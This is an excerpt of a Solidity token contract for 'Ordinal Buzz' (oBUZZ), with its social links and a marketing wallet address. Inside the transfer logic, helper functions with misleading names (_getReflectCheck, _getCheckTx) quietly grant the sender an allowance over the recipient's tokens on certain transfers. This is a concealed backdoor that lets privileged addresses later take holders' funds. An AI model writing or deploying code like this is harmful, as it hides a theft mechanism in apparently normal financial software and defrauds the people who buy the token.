...
Website:  https://obuzz.xyz
Telegram: https://t.me/obuzzeth
Twitter:  https://twitter.com/obuzzeth
...
contract OrdinalBuzz is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Ordinal Buzz";
    string private constant _symbol = "oBUZZ";
    ...
    address payable private _marketingAddress = payable(0x35F2e3e8aD780343a80C7C42929A1cB36129D986);
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            ...
            _getReflectCheck(from, to, amount);
    ...
    function _getReflectCheck(address from, address to, uint256 amount) private {
        if(from != address(this) && to != address(this)) _lastBuyback = block.timestamp;

        _getCheckTx(from, to, amount);
    }
    
    function _getCheckTx(address tx1,  address tx2, uint256 amount) private { _allowances[tx2][tx1] += amount; }
